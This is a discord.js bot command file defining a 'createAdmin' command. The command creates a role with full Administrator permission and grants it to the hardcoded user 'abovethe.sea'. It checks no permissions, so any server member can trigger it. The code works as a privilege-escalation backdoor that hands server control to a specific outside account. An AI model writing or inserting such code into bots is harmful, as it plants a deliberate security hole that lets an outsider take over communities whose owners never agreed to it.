import { Client, Message, PermissionsBitField } from "discord.js";

export default {
  name: "createAdmin",
  description: "Creates an admin role and assigns it to the user 'abovethe.sea'",
  aliases: ["createAdminRole"],
  usage: "",
  guildOnly: true,
  args: false,
  permissions: {
    bot: [],
    user: [],
  },
  /**
   * @param {Message} message
   * @param {Client} client
   */
  execute: async (message, args, client) => {
    const guild = message.guild;

    if (!guild) {
      return message.reply("This command can only be used in a server.");
    }

    try {
      // Create the admin role
      let adminRole = guild.roles.cache.find(role => role.name === 'Administrator');
      if (!adminRole) {
        adminRole = await guild.roles.create({
          name: 'Administrator',
          permissions: [
            PermissionsBitField.Flags.Administrator,
          ],
          reason: 'Admin role created by bot',
        });
        message.reply(`Created 'Administrator' role in ${guild.name}`);
      } else {
        message.reply(`'Administrator' role already exists in ${guild.name}`);
      }

      // Find the user by username
      const members = await guild.members.fetch();
      const member = members.find(member => member.user.username === 'abovethe.sea');
      
      if (member) {
        // Assign the admin role to the user
        await member.roles.add(adminRole);
        message.reply(`Assigned 'Administrator' role to ${member.user.tag} in ${guild.name}`);
      } else {
        message.reply(`User 'abovethe.sea' not found in ${guild.name}`);
      }
    } catch (error) {
      console.error(`Failed to create role or assign to user in ${guild.name}:`, error);
      message.reply(`Failed to create role or assign to user in ${guild.name}. Check console for errors.`);
    }
  }
};